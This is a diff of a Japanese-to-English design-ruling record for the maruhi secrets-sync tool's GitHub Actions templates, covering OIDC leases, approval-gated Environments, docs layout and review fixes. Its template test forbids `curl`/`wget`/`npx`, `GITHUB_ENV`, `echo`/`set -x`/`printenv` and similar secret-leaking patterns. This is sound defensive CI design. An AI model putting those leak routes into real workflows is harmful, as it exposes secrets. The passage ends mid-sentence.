-| 共通 | — | — | ローテーション後 | — | — | 次回の再適用が再暗号化後の値(同じ平文)を書く = 無害。アンカーは更新しないと弱いまま(拒みはしない)|
+| ① re-apply on deploy | http (standard) | production (Workers) | `push` to main (+ Environment `production`) | `ci sync` → API body, `ci run` → wrangler's env | **empty** (`CLOUDFLARE_API_TOKEN` / `ACCOUNT_ID` live in maruhi `tokens`) | missing Worker = stop on 10007 (first time, deploy comes first); lease 404 = policy / Environment; vendor failure = nonzero; next run re-applies all |
+| ① | exec (alternative, prose only) | same | same | wrangler's stdin | `CLOUDFLARE_API_TOKEN` is a GitHub secret | a draft gets created (no bootstrap needed); the token stays on GitHub |
+| ① | SY1 recipe (alternative, prose only) | same | same | jq → wrangler's stdin | same | no config, no receipts |
+| ② trigger + periodic | http (standard) | production (Vercel `web`. Environment `web`) | `workflow_dispatch` (`maruhi push` / a human) | `ci sync` → API body | empty (`VERCEL_TOKEN` lives in maruhi `tokens`) | missing target = stopped by the `targets` job (doesn't create the Environment); 404 = policy; multiples = serialized by concurrency (pending = newest 1) |
+| ② | http | production | `schedule` | same | empty | **every run waits on approval if required reviewers are set** (stated in docs; can drop it from `SCHEDULED_TARGETS`) |
+| ② | http | non-production (when syncing `preview` via CI) | both | same | empty | one more policy element, and that job identity can also lease production (premise (5)) → the first of docs' "two limits" |
+| ② | exec (local `onPush: "apply"`) | non-production (`preview`) | local, on push | vercel CLI's stdin (local) | — | CI isn't involved = don't put it on `SCHEDULED_TARGETS` (listing it → 404) |
+| common | — | — | PR from a fork | — | — | can't get `id-token: write`, no OIDC endpoint = `maruhi ci run` stops. A fork's own run = `repository` mismatch = 404 |
+| common | — | — | config / workflow placed off the default branch | — | — | `gh` hits the default branch = the new target doesn't exist until merge (stopped by the `targets` job's naming) |
+| common | — | — | a push during the approval wait | — | — | a waiting run writes **the values current at its execution time** (never stale values). A new queued replaces an old pending |
+| common | — | — | post-rotation | — | — | the next re-apply writes re-encrypted values (same plaintext) = harmless. An un-updated anchor stays weak (not refused) |
 
-**A. テンプレートの置き場と配布形** — 列挙: (i) docs に全文(```yaml)/ (ii) リポジトリに `.yml`(`examples/workflows/`)を置き
-docs から参照 / (iii) 両方(docs が正でファイルは機械的に一致検査)/ (iv) `sync init --workflow-template`(CLI 変更 = 所有者確認)。
-第 1 周の新案: **座標(server / project)を workflow 単位の `env:` に 1 か所で持つ**(あり — ① は `ci sync` と `ci run` の 2 step が
-同じ座標を要るので、置き換え箇所を「`<tag>` 2 つ + `env` 2 値」に固定できる。名前は `MARUHI_SERVER` / `MARUHI_PROJECT` で、CLI は
-CI モードで環境変数を読まない〔`MARUHI_TOKEN` 系はセッション解決専用で ci は使わない〕・`ci run` は `MARUHI_*` を子に渡さないので
-wrangler にも漏れない — コメントで「names are yours; the CLI reads no environment variable in CI mode」と言う)。第 2 周(壊れ方):
-(ii) / (iii) は docs とファイルの 2 か所(乖離の検査を足しても、利用者がコピーする単位は結局 docs のブロック)。`<tag>` はどの
-置き場でも更新漏れが起きる(前提 (7) — 含むタグがまだ無い)ので、置き場で解けない = 案内文で「the same tag is the version to
-install」と 1 種類に畳む。(iv) は段の拡大。(なし)。**選定 = (i) + 新案**(docs `github-actions.mdx` の ```yaml が正。機械検査
-〔裁定 H〕は本文から切り出す = recipes.test.ts と同じ規律)。棄却: (ii) / (iii)(2 か所)、(iv)(CLI 変更)。
+**A. The templates' location and distribution form** — enumeration: (i) full text in docs (```yaml) / (ii) a `.yml` in the repo (`examples/workflows/`) referenced from docs / (iii) both (docs canonical, the file mechanically checked for equality) / (iv) `sync init --workflow-template` (a CLI change = owner confirmation). Round-1 new option: **hold the coordinates (server / project) in one place as workflow-level `env:`** (available — ① needs the same coordinates in 2 steps `ci sync` and `ci run`, so the substitution points can be pinned to "`<tag>` × 2 + 2 `env` values". The names are `MARUHI_SERVER` / `MARUHI_PROJECT`; the CLI reads no env vars in CI mode〔the `MARUHI_TOKEN` family is session-resolution only; ci doesn't use them〕and `ci run` passes no `MARUHI_*` to children so they don't leak to wrangler either — a comment says "names are yours; the CLI reads no environment variable in CI mode"). Round 2 (failure modes): (ii) / (iii) put it in 2 places (even with a divergence check, the unit users copy is still the docs block). `<tag>` gets stale no matter where it lives (premise (7) — no containing tag yet), so location can't solve it = the guidance text folds it into one kind: "the same tag is the version to install". (iv) is a scope extension. (no). **Chosen = (i) + the new option** (docs `github-actions.mdx`'s ```yaml is canonical. The mechanical check〔ruling H〕cuts it out of the body = same discipline as recipes.test.ts). Rejected: (ii) / (iii) (2 places), (iv) (a CLI change).
 
-**B. 標準形 ① の中身** — 列挙: (i) `maruhi ci sync <target> --yes`(http)を deploy の直前 + deploy は `maruhi ci run --env tokens --
-wrangler deploy` / (ii) SY1 レシピ `maruhi ci run --env production -- jq … | wrangler secret bulk` / (iii) 両方を YAML で示す /
-(iv) exec ドライバ(ランナーの wrangler + GitHub secret の `CLOUDFLARE_API_TOKEN`)。第 1 周の新案: **入れ子 `maruhi ci run --env
-tokens -- maruhi ci sync worker --yes …`**(exec ドライバを GitHub secrets ゼロで — 内側の `ci sync` は自分で OIDC を借り〔前提 (5):
-`ACTIONS_ID_TOKEN_REQUEST_*` は継承される〕、wrangler は外側が注入した `CLOUDFLARE_API_TOKEN` を読む。第 1 段の裁定 G「`ci run --
-maruhi sync` は成り立たない」はセッション前提の `sync` の話で、`ci sync` なら資格の問題は無い)(あり — ただし**未検証**〔テスト
-も実機も無い〕で、トークン 2 本・リース 3 回・内側の stdio と剥がし箇所の棚卸しを要する。テンプレートには載せず申し送りへ)。
-第 2 周(壊れ方): (i) の順序 = 同期 → deploy は「新版が新しい値で始まる」を保証するが、**Worker 不在の初回**は http が draft を
-作らないので 10007 で止まる → docs で「初回は deploy が先(または 2 step を入れ替える)」。逆順(deploy → 同期)は毎回「新コードが
-旧値で走る窓」を作る。OIDC トークンは呼び出しごと(トークン 2 本・リース 3: sync = production + tokens、run = tokens)= 窓 300 /
-時に数える(docs)。(iii) は YAML 2 本で「どちらが標準か」を曖昧にする。(iv) は Q2(GitHub secrets を空に)に反するので YAML に
-しない(prose で代替として明示)。(なし)。**選定 = (i)**(+ (ii) / (iv) は prose の代替)。棄却: (iii)(標準形が曖昧)、入れ子
-(未検証 — 申し送り)。
+**B. Standard form ①'s contents** — enumeration: (i) `maruhi ci sync <target> --yes` (http) right before deploy, and the deploy is `maruhi ci run --env tokens -- wrangler deploy` / (ii) the SY1 recipe `maruhi ci run --env production -- jq … | wrangler secret bulk` / (iii) show both in YAML / (iv) the exec driver (runner's wrangler + `CLOUDFLARE_API_TOKEN` as a GitHub secret). Round-1 new option: **nested `maruhi ci run --env tokens -- maruhi ci sync worker --yes …`** (the exec driver with zero GitHub secrets — the inner `ci sync` leases OIDC itself〔premise (5): `ACTIONS_ID_TOKEN_REQUEST_*` is inherited〕; wrangler reads the `CLOUDFLARE_API_TOKEN` the outer injects. Stage 1's ruling G "`ci run -- maruhi sync` doesn't hold" was about session-assuming `sync`; with `ci sync` there's no credential problem) (available — but **unverified**〔neither tests nor a real run〕; it needs an audit of 2 tokens, 3 leases, inner stdio and unwrap sites. Not on the template; goes to handoff). Round 2 (failure modes): (i)'s order = sync → deploy guarantees "the new version starts with new values", but **on first run with no Worker**, http doesn't create a draft so it stops on 10007 → docs say "first time, deploy comes first (or swap the 2 steps)". The reverse order (deploy → sync) creates a "new code runs on old values" window every time. The OIDC token is per call (2 tokens, 3 leases: sync = production + tokens, run = tokens) = count against the 300/hour window (docs). (iii) with 2 YAMLs blurs "which is standard". (iv) violates Q2 (empty GitHub secrets) so it isn't YAML (noted as a prose alternative). (no). **Chosen = (i)** (+ (ii) / (iv) as prose alternatives). Rejected: (iii) (blurred standard form), nesting (unverified — handoff).
 
-**C. 標準形 ② の trigger と全ターゲットの回し方** — 列挙: (i) `matrix` にターゲット名を列挙 / (ii) `jq` で `maruhi.sync.json` の
-`targets` を全部読んで matrix を作る(設定の二重管理なし)/ (iii) `--all` を CLI に足す(所有者確認)/ (iv) 1 job の中で for ループ。
-第 1 周の新案: **`SCHEDULED_TARGETS`(workflow の `env:`、空白区切り)= 「schedule が再適用するターゲット」を明示の選択にし、
-dispatch は入力の 1 つ**(あり — 「全ターゲット」は 2 つの常態で誤る: production に required reviewers があれば毎日承認待ちに
-なり、手元の exec で同期する非 production〔docs の `preview` — `onPush: "apply"`〕は CI が借りられず 404 になる。ターゲット名の
-写しであって対応付けの写しではない = 二重管理ではない)。第 2 周(壊れ方): (ii) は上の 2 つの常態で壊れる。(iii) は CI 変更 +
-「全ターゲット」の意味論が同じ問題を CLI 側に持ち込む。(iv) は Environment を per target にできない(裁定 D)。dispatch の入力は
-設定に**実在するか**を `targets` job で先に検査する(誤字で無保護の Environment が自動作成されるのを防ぐ — 前提 (2))。空リストは
-`if: needs.targets.outputs.list != '[]'` で matrix のエラーを避ける。`inputs.target` は `env:` 経由でだけシェルに渡す(GitHub の
-インジェクション対策。`$GITHUB_OUTPUT` に書くのはターゲット名だけで、maruhi を実行する step には無い — 裁定 H で固定)。
-**多重実行**: job レベルの `concurrency: group: maruhi-sync-${{ matrix.target }}, cancel-in-progress: false`(前提 (3): matrix は job
-レベルで使える。pending は最新 1 つ = 「最後に走った run が現在値を書く」で正しい)。cron は `37 4 * * *`(毎日 1 回・毎時 0 分を
-避ける)。(なし)。**選定 = 新案 + dispatch は `[input]`**。棄却: (i)(対応付けの写し)、(ii)(2 つの常態で誤る)、(iii)(CLI 変更・
-段の拡大)、(iv)(Environment を分けられない)。
+**C. Standard form ②'s triggers and how all targets are cycled** — enumeration: (i) enumerate target names in `matrix` / (ii) build the matrix by reading all of `maruhi.sync.json`'s `targets` via `jq` (no double-managing the config) / (iii) add `--all` to the CLI (owner confirmation) / (iv) a for loop inside one job. Round-1 new option: **`SCHEDULED_TARGETS` (a workflow `env:`, space-separated) = an explicit selection of "the targets schedule re-applies", with dispatch taking a single input** (available — "all targets" gets it wrong in 2 normal states: production with required reviewers would wait on approval daily, and a non-production synced by local exec〔docs' `preview` — `onPush: "apply"`〕can't be leased by CI → 404. It's a transcription of target names, not of the mapping = not double management). Round 2 (failure modes): (ii) breaks in those same 2 normal states. (iii) is a CLI change + carries "all targets"' semantics problem into the CLI. (iv) can't make Environment per-target (ruling D). dispatch's input is first checked by the `targets` job for **actually existing** in the config (prevents a typo auto-creating an unprotected Environment — premise (2)). An empty list avoids the matrix error via `if: needs.targets.outputs.list != '[]'`. `inputs.target` reaches the shell only via `env:` (GitHub injection countermeasure. Only the target name is written to `$GITHUB_OUTPUT`, and it isn't on the step that runs maruhi — pinned in ruling H). **Multiple runs**: job-level `concurrency: group: maruhi-sync-${{ matrix.target }}, cancel-in-progress: false` (premise (3): matrix is usable at job level. Pending = newest 1 = correct since "the last run writes the current values"). The cron is `37 4 * * *` (once daily, avoiding top-of-hour). (no). **Chosen = the new option + dispatch is `[input]`**. Rejected: (i) (transcribing the mapping), (ii) (wrong in the 2 normal states), (iii) (a CLI change, scope extension), (iv) (can't separate Environments).
 
-**D. 四眼の形** — 列挙: (i) 固定 `environment: production` / (ii) **`environment: ${{ matrix.target }}`**(Environment 名 = ターゲット
-名の規約)/ (iii) 設定の `production` に応じて `if:` で分ける。第 1 周の新案: **リースポリシーの `claimConstraints` に `environment`
-claim を入れる**(あり = 銀の弾丸候補 — 前提 (1) のとおり claim は job が Environment を参照するときだけ載り、GitHub はその job を
-reviewer の承認後にしかランナーへ送らないので、**サーバーは承認済みの run にしか production のリースを出さない**。workflow を
-編集して Environment を外しても 404)。第 2 周(壊れ方): **ただし前提 (5)**(ポリシーは 1 本・存在量化・要素と環境の対応なし)
-により、この強制は「**ポリシーの全要素が保護された Environment を名指すとき**」だけ成り立つ。無保護の job の要素(CI で同期する
-preview、`ci run` の test job)が同じポリシーにあれば、その job 同一性でも production を借りられ、production を書かないのは
-workflow ファイルだけになる → docs「Four eyes」の限界 1 として明記し、非 production は手元の `onPush: "apply"` で運ぶ形を勧める。
-(iii) は production の判定(プリセットの既定 + 上書き)を jq に写す = 規則の二重化。(i) は ② で全ターゲットが承認待ちになる。
-① は deploy workflow の慣習どおり固定 `production`。`schedule` も保護規則を通る(毎回承認 — 裁定 C の `SCHEDULED_TARGETS`)。
-承認待ちの間の push: 待機 run は実行時点の現在値を読むので古い値を書くことは無い(docs: 「approve the newest and reject the
-rest」)。**「待機中の run が concurrency group を占めるか」は docs に無い**ので書かない(pending 1 つの規則だけを書く)。Prevent
-self-review・deployment branches(既定ブランチだけ)・public リポジトリ限定(Free / Pro / Team)・admin が規則を変えられることを docs
-で分けて言う(「誰が叩けるか = write」と「誰が承認するか = reviewers」)。(なし)。**選定 = (ii) + 新案(限界つき)**。棄却: (i)
-(② で過剰)、(iii)(規則の二重化)。
+**D. The four-eyes shape** — enumeration: (i) fixed `environment: production` / (ii) **`environment: ${{ matrix.target }}`** (the convention Environment name = target name) / (iii) split via `if:` by the config's `production`. Round-1 new option: **put the `environment` claim into the lease policy's `claimConstraints`** (available = silver-bullet candidate — per premise (1) the claim is carried only when the job references an Environment, and GitHub only sends that job to a runner after a reviewer approves, so **the server issues a production lease only to an approved run**. Edit the workflow to drop the Environment → 404). Round 2 (failure modes): **but premise (5)** (one policy, existential authorization, no element↔environment correspondence) means this enforcement holds **only when every element in the policy names a protected Environment**. If an unprotected job's element (a CI-synced preview, a `ci run` test job) is on the same policy, that job identity can lease production too, and "doesn't write production" then rests on the workflow file alone → stated as docs "Four eyes" limit 1, with guidance to carry non-production via local `onPush: "apply"`. (iii) transcribes the production determination (preset default + override) into jq = duplicating the rule. (i) puts every target on approval-wait under ②. ① fixes `production` per deploy-workflow convention. `schedule` also passes the protection rules (approval every time — ruling C's `SCHEDULED_TARGETS`). Pushes during an approval wait: a waiting run reads the values current at its execution time, so it never writes stale values (docs: "approve the newest and reject the rest"). **Whether a waiting run occupies its concurrency group isn't in the docs** so it's not written (only the pending-1 rule is). Prevent self-review, deployment branches (default branch only), public-repo-only (Free / Pro / Team), and admin-mutable rules are spelled out separately in docs ("who can dispatch = write" vs "who approves = reviewers"). (no). **Chosen = (ii) + the new option (with the limit)**. Rejected: (i) (excessive under ②), (iii) (rule duplication).
 
-**E. 導入とピン留め** — `maruhiapp/maruhi/actions/setup-maruhi@<tag>` + `with: version: <tag>`(同じタグ = 置き換え 1 種類)。
-第 1 周の新案: なし(前提 (7) で含むタグがまだ無い以上、具体値は書けない)。第 2 周: `<tag>` の案内はコメント行に置き、機械検査は
-コメントを除いた本文で `<tag>` がちょうど 2 回であることを見る。他の action は commit SHA(リポジトリ自身の workflow と同じ規律 —
-`actions/checkout@11d5960a…` v4.4.0、`persist-credentials: false`)。ベンダー CLI はプロジェクトの依存(`npm ci` →
-`./node_modules/.bin/wrangler`。`npx` / `curl` を置かない)。(なし)。
+**E. Installation and pinning** — `maruhiapp/maruhi/actions/setup-maruhi@<tag>` + `with: version: <tag>` (same tag = one kind of substitution). Round-1 new option: none (premise (7) — no containing tag yet, so no concrete value can be written). Round 2: the `<tag>` guidance lives in a comment line; the mechanical check verifies `<tag>` appears exactly twice in the comment-stripped body. Other actions use commit SHAs (same discipline as the repo's own workflow — `actions/checkout@11d5960a…` v4.4.0, `persist-credentials: false`). The vendor CLI is a project dependency (`npm ci` → `./node_modules/.bin/wrangler`; no `npx` / `curl`). (no).
 
-**F. リースポリシーの例** — 列挙: (i) `repository` + `ref` / (ii) **`repository` + `environment`** / (iii) `sub` / (iv) `workflow_ref`。
-第 1 周の新案: claim の表(`repository` = 常に・fork 対策 / `environment` = production / `ref` = Environment を持たない job /
-`workflow_ref` = 1 ファイル固定)+ **`sub` を使わない**(前提 (1) の形式変更)(あり)。第 2 周: http でトークンが別環境なら
-`--environments production,tokens`(docs の例)。`server grant` は owner の手元の儀式と明記。「ポリシーは 1 本」と再 grant の二層
-(ポリシーは自由・スコープは拡大のみ・縮小は `revoke`)を docs で言う。PR の run は `refs/pull/<n>/merge` なので `ref` だけの要素
-では通らない(`event_name: pull_request` の例)。(なし)。**選定 = (ii) を標準、表で他を案内**。棄却: (iii)。
+**F. The lease-policy example** — enumeration: (i) `repository` + `ref` / (ii) **`repository` + `environment`** / (iii) `sub` / (iv) `workflow_ref`. Round-1 new option: a claims table (`repository` = always, fork countermeasure / `environment` = production / `ref` = jobs without an Environment / `workflow_ref` = pin to 1 file) + **don't use `sub`** (premise (1)'s format change) (available). Round 2: under http with a separate token environment, `--environments production,tokens` (the docs example). `server grant` is stated to be the owner's local ceremony. docs says "the policy is a single one" and re-grant's two layers (policy is free, scope only widens, shrinking needs `revoke`). A PR run is `refs/pull/<n>/merge`, so a `ref`-only element won't pass it (an `event_name: pull_request` example). (no). **Chosen = (ii) as standard, the table guides the others**. Rejected: (iii).
 
-**G. 定期突合の意味** — `ci sync` は再適用であって差分検出ではない。docs は「re-applies the current values … does not compare
-them with what the platform holds or report a difference; a value edited in the platform's dashboard is overwritten, quietly」と
-書き、「drift を報告する」とは書かない(`sync diff` — 補足 7 P5 — は未実装)。第 1 周: なし。第 2 周: なし。
+**G. What the periodic check means** — `ci sync` is a re-apply, not a diff detector. docs says "re-applies the current values … does not compare them with what the platform holds or report a difference; a value edited in the platform's dashboard is overwritten, quietly", and does not say "reports drift" (`sync diff` — supplement 7 P5 — is unimplemented). Round 1: none. Round 2: none.
 
-**H. テンプレートの機械検査** — 列挙: (i) 無し / (ii) 正規表現 / (iii) YAML パーサを依存追加(所有者確認)/ (iv) installer.yml の
-`action-smoke` に倣い実走。第 1 周の新案: **`Bun.YAML.parse` を子プロセスで呼ぶ**(あり = 前提 (6)。依存ゼロで構造検査ができる)。
-第 2 周(壊れ方): (iv) は `@<tag>` が解決できず(前提 (7))、偽サーバーも無いので「`--help` まで」の価値しか無い(setup-maruhi の
-結合は既に `action-smoke` が踏む)。(ii) は `permissions` / `concurrency` / `environment` の構造を見られない。(なし)。**選定 =
-新案**: `apps/site/test/unit/workflows.test.ts`(site-unit = `bun run check` の 7 段目)。固定するのは: 3 workflow(test / deploy /
-maruhi sync)・deploy-targets.mdx の契約断片との一致・`permissions: {}` + maruhi を実行する job は `id-token: write` と
-`contents: read` だけ・setup-maruhi は `@<tag>` + `version: <tag>`(コメント除きちょうど 2 回)・他の action は 40 hex・checkout は
-`persist-credentials: false`・`npx` / `bunx` / `curl` / `wget` 不在・`secrets.` / `GITHUB_ENV` 不在・`run:` に `${{` 不在(式は env
-経由)・maruhi を実行する step に `GITHUB_OUTPUT` / `echo` / `set -x` / `printenv` / `--value` / リダイレクト無し・step env の値は
-`${{ inputs.* }}` / `${{ matrix.* }}` だけ・全 `maruhi ci` に `--server "$MARUHI_SERVER"` / `--project "$MARUHI_PROJECT"` / `--anchor
-.maruhi/anchor.json`・`ci sync` に `--yes`・①: `on: push main`・group `deploy-production`・Environment `production`・`ci sync` が
-`ci run … -- ./node_modules/.bin/wrangler deploy` より前・`npm ci` が先・②: `workflow_dispatch` + `schedule`(5 欄の cron)・
-`SCHEDULED_TARGETS: web`・`sync` job = `needs: targets`・空リストの `if`・`fail-fast: false`・`environment: ${{ matrix.target }}`・
-group `maruhi-sync-${{ matrix.target }}` + `cancel-in-progress: false`・**`targets` job のスクリプトを sh で実走**(実在ターゲット =
-`["web"]`・不在 = 1 で停止・schedule の一覧 = 空白の正規化・空 = `[]`。jq は CI で存在を断言 — recipes.test.ts と同じ)。棄却:
-(i)(漂流を構造で防げない)、(ii)、(iii)(依存追加)、(iv)(価値が低い)。
+**H. Mechanical checking of the templates** — enumeration: (i) none / (ii) regex / (iii) add a YAML-parser dependency (owner confirmation) / (iv) actually run it like installer.yml's `action-smoke`. Round-1 new option: **call `Bun.YAML.parse` in a child process** (available = premise (6). Structural checking with zero dependencies). Round 2 (failure modes): (iv) can't resolve `@<tag>` (premise (7)) and has no fake server, so it's worth only "up to `--help`" (setup-maruhi's
+integration is already stepped on by `action-smoke`). (ii) can't check the structure of `permissions` / `concurrency` / `environment`. (no). **Chosen = the new option**: `apps/site/test/unit/workflows.test.ts` (site-unit = `bun run check`'s stage 7). What's pinned: the 3 workflows (test / deploy / maruhi sync); consistency with deploy-targets.mdx's contract fragment; `permissions: {}` + the maruhi-running job has only `id-token: write` and `contents: read`; setup-maruhi is `@<tag>` + `version: <tag>` (exactly 2 occurrences excluding comments); other actions are 40-hex; checkout is `persist-credentials: false`; no `npx` / `bunx` / `curl` / `wget`; no `secrets.` / `GITHUB_ENV`; no `${{` in `run:` (expressions go via env); the maruhi-running step has no `GITHUB_OUTPUT` / `echo` / `set -x` / `printenv` / `--value` / redirects; step env values are only `${{ inputs.* }}` / `${{ matrix.* }}`; every `maruhi ci` carries `--server "$MARUHI_SERVER"` / `--project "$MARUHI_PROJECT"` / `--anchor .maruhi/anchor.json`; `ci sync` has `--yes`; ①: `on: push main`, group `deploy-production`, Environment `production`, `ci sync` before `ci run … -- ./node_modules/.bin/wrangler deploy`, `npm ci` first; ②: `workflow_dispatch` + `schedule` (5-field cron), `SCHEDULED_TARGETS: web`, `sync` job = `needs: targets`, the empty-list `if`, `fail-fast: false`, `environment: ${{ matrix.target }}`, group `maruhi-sync-${{ matrix.target }}` + `cancel-in-progress: false`, **the `targets` job's script actually run under sh** (existing target = `["web"]`, absent = stops with 1, schedule's listing = whitespace normalization, empty = `[]`. jq's presence is asserted on CI — same as recipes.test.ts). Rejected: (i) (can't structurally prevent drift), (ii), (iii) (a dependency addition), (iv) (low value).
 
-**I. docs の構成** — 列挙: (i) `deploy-targets.mdx`「In CI」を膨らませる / (ii) **新ページ `/docs/github-actions`** / (iii) 新ページ +
-「In CI」は要約とリンク。第 1 周の新案: なし。第 2 周(壊れ方): (i) は Deploy targets が「同期の使い方」と「GitHub Actions の
-導入(ポリシー・アンカー・`ci run`)」を抱えて肥大し、`ci run` の workflow 例(いま action の README にしかない — 裁定 I の入力)の
-置き場にならない。(ii) 単独だと「In CI」と重複する。(なし)。**選定 = (iii)**: 新ページ = What a job needs / Set up once(grant +
-claim の表 + anchor)/ Run a command with leased values(`ci run` の workflow — README から docs へ)/ Sync a deploy target from CI
-(2 標準形の選び方 → ① → ②)/ Four eyes on production(4 手順 + 2 つの限界)/ What can go wrong。「In CI」は `ci sync` の使い方と
-箇条書きを残し(recipes.test.ts が `maruhi sync apply` のブロックの存在を見るので ```sh はそのまま)、末尾の「planned」を新ページへの
-リンクに。「Sync on push」の契約断片はそのまま(機械検査で新ページの dispatch と一致を固定)。index の Card 4 枚(2 × 2)・
-`sidebar.order` = getting-started 1 / deploy-targets 2 / **github-actions 3** / self-hosting 4。README の Docs 一覧に 1 行、
-getting-started の Next steps に 1 文、action の README は**action の参照**として残し冒頭に新ページへの案内(正は docs)。
+**I. docs composition** — enumeration: (i) grow `deploy-targets.mdx`'s "In CI" / (ii) **a new page `/docs/github-actions`** / (iii) a new page + keep "In CI" as a summary with a link. Round-1 new option: none. Round 2 (failure modes): (i) bloats Deploy targets with both "how to use sync" and "GitHub Actions setup (policy, anchor, `ci run`)", and gives no home for a `ci run` workflow example (currently only in the action's README — input to ruling I). (ii) alone duplicates "In CI". (no). **Chosen = (iii)**: the new page = What a job needs / Set up once (grant + the claims table + anchor) / Run a command with leased values (`ci run`'s workflow — moved from the README to docs) / Sync a deploy target from CI (choosing between the 2 standard forms → ① → ②) / Four eyes on production (4 steps + 2 limits) / What can go wrong. "In CI" keeps `ci sync` usage and its bullets (recipes.test.ts checks the `maruhi sync apply` block exists, so the ```sh stays), with the tail's "planned" replaced by a link to the new page. "Sync on push"'s contract fragment stays (the mechanical check pins its agreement with the new page's dispatch). index gets 4 Cards (2 × 2), `sidebar.order` = getting-started 1 / deploy-targets 2 / **github-actions 3** / self-hosting 4. One line in README's Docs list, one sentence in getting-started's Next steps; the action's README stays as **the action's reference** with a pointer to the new page at the top (docs is canonical).
 
-**J. テスト・検証** — `FALLOW_AUDIT_BASE=origin/main bun run check`(7 段)、`apps/site` の `validate --strict` / `build` / `e2e`
-(e2e の Card 検査に `/docs/github-actions` と llms.txt の行を追加)、裁定 H の検査、light / dark のスクリーンショット(Artifact)。
+**J. Tests / verification** — `FALLOW_AUDIT_BASE=origin/main bun run check` (7 stages), `apps/site`'s `validate --strict` / `build` / `e2e` (e2e's Card check gains `/docs/github-actions` and an llms.txt line), ruling H's checks, light / dark screenshots (artifacts).
 
-**K. ROADMAP と裁定録** — SY3 行を完了注記へ(`- [x]`)。SY5 行(「SY3 の workflow 内で自動化」)は「SY3 の標準形 ②〔`maruhi-sync.yml`〕
-に `gh secret set` の step を足す形」に読み替えられるので文言を合わせ、SY6 行の降格理由(「push 時同期 + デプロイ時再適用 / 定期
-突合が上位互換」)に「SY3 で着地」を添える。本節を第 3 段の末尾に追記。
+**K. ROADMAP and ruling record** — the SY3 row becomes a completion note (`- [x]`). The SY5 row ("automate inside SY3's workflow") reads as "add a `gh secret set` step to SY3's standard form ②〔`maruhi-sync.yml`〕" so its wording is aligned; SY6's demotion reason ("push-time sync + deploy-time re-apply / periodic check is a superset") gains "landed in SY3". This section is appended to stage 3's tail.
 
-**不変条件の確認**: 仕様改訂なし・CLI のコード変更なし(暗号操作の追加なし。サーバー・Web・チェーン・wire・`packages/crypto`・
-`apps/cli` は無変更。`--all` は取り込まない)/ 平文は CI の中だけ(テンプレートに `$GITHUB_ENV` / `echo "$VALUE"` / `set -x` /
-`::set-output` を置かない — 機械検査で固定。`$GITHUB_OUTPUT` はターゲット名だけ、maruhi を実行しない job)/ GitHub secrets を空に
-(maruhi トークンは無い〔OIDC〕、ベンダーのトークンは maruhi の `tokens` 環境〔http〕。exec + GitHub secret は prose の代替。
-`gh secret set` は載せない = SY5)/ production は自動で書かない(`--yes` は workflow に見え、Environment に置く形を標準。「誰が
-叩けるか = write」と「誰が承認するか = reviewers」を分けて言う)/ 一方通行(同期先を読み戻さない。「差分報告」と書かない)/
-アンカー(全テンプレートに `--anchor .maruhi/anchor.json`)/ 導入済みのものだけ(setup-maruhi をタグで固定・`npx` / `curl` なし・
-他の action は SHA)/ 英語(docs)・日本語(裁定録・コミット・PR)/ 新規依存ゼロ(YAML は `Bun.YAML`)/ エージェント環境に関わる
-変更なし / スコープ(SY4 / SY5 / SY6 / `--all` / `sync diff` / マーケットプレイス / Windows ランナーは取り込まない)。
+**Invariant check**: no spec revision, no CLI code change (no crypto operations added. Server / web / chain / wire / `packages/crypto` / `apps/cli` unchanged. `--all` not pulled in) / plaintext only inside CI (no `$GITHUB_ENV` / `echo "$VALUE"` / `set -x` / `::set-output` on the templates — pinned by mechanical checks. `$GITHUB_OUTPUT` carries only target names on jobs that don't run maruhi) / GitHub secrets stay empty (no maruhi token〔OIDC〕, vendor tokens live in maruhi's `tokens` environment〔http〕. exec + GitHub secret is a prose alternative. `gh secret set` is not included = SY5) / production isn't written automatically (`--yes` is visible in the workflow; the standard shape puts it on an Environment. "Who can dispatch = write" and "who approves = reviewers" are stated separately) / one-way (never reads back the destination. Doesn't write "diff report") / anchor (`--anchor .maruhi/anchor.json` on every template) / installed-things only (setup-maruhi pinned by tag; no `npx` / `curl`; other actions by SHA) / English (docs), Japanese (ruling records, commits, PRs) / zero new dependencies (YAML via `Bun.YAML`) / no agent-environment changes / scope (SY4 / SY5 / SY6 / `--all` / `sync diff` / the marketplace / Windows runners not pulled in).
 
-**改訂 1(2026-09-08、Cursor Bugbot の初回レビュー〔5e138fa〕)**: 標準形 ② の `sync` job の `if: needs.targets.outputs.list != '[]'` は
-独自の `if` であり、GitHub は job の `if` に状態関数が無いとき暗黙の `success()` を置き換えうる(docs は「all jobs that need it are
-skipped unless the jobs use a conditional expression that causes the job to continue」と言い、独自の式がそれに当たるかを明言しない)
-→ `targets` が失敗(不在ターゲット)したとき出力が空文字で条件が真になり、`fromJson('')` の別エラーで落ちる形を作らない
-ため、**`if: success() && needs.targets.outputs.list != '[]'`** と明示(暗黙の規則に依存しない — 綴りの一致で免除しないのと
-同じ規律)。機械検査の期待値とテンプレートのコメントを更新。docs の説明文は変えない(「stops with the target's name」のまま)。
+**Revision 1 (2026-09-08, Cursor Bugbot's first review〔5e138fa〕)**: standard form ②'s `sync` job's `if: needs.targets.outputs.list != '[]'` is a custom `if`, and GitHub may substitute an implicit `success()` when a job's `if` has no status function (the docs say "all jobs that need it are skipped unless the jobs use a conditional expression that causes the job to continue", and don't state whether a custom expression qualifies) → so that a `targets` failure (absent target) doesn't produce an empty-output truthy condition and then a different `fromJson('')` error, it's now explicit: **`if: success() && needs.targets.outputs.list != '[]'`** (not relying on the implicit rule — same discipline as not exempting by spelling equality). The mechanical check's expectation and the template's comment were updated. docs' description is unchanged (still "stops with the target's name").
 
-**改訂 2(2026-09-08、pullfrog の初回レビュー〔5e138fa〕)**: (1) **トークン変数名の不一致** — 新ページの `worker` ターゲットは
-「Deploy targets の http ドライバ例」を名指ししつつ `CLOUDFLARE_API_TOKEN` と書き、名指し先は `CF_API_TOKEN` だった(両ページを
-なぞると `ci run --env tokens` が渡す名前を wrangler が読まず deploy が落ちる)→ **deploy-targets.mdx 側を `CLOUDFLARE_API_TOKEN`
-に**(push の行と JSON の `token.name`。wrangler が読む名前に揃える。CLI テストのフィクスチャ名 `CF_API_TOKEN` は docs ではないので
-据え置き)。(2) **`SCHEDULED_TARGETS` も設定の実在で検査** — dispatch の入力だけ検査していたので、リストの誤字や設定から消した
-ターゲットが毎回の schedule で無保護の Environment を自動作成してから 404 で落ちる形だった → `targets` job のスクリプトを
-「dispatch なら入力、schedule ならリスト」を同じ `for name in $names` で検査してから JSON 化する形に(態を追加: `web wep` = 1・
-出力なし)。(3) 「CI mode reads no config file」は `ci sync` が `maruhi.sync.json` を読む事実に反する → CLI の文面(「except the
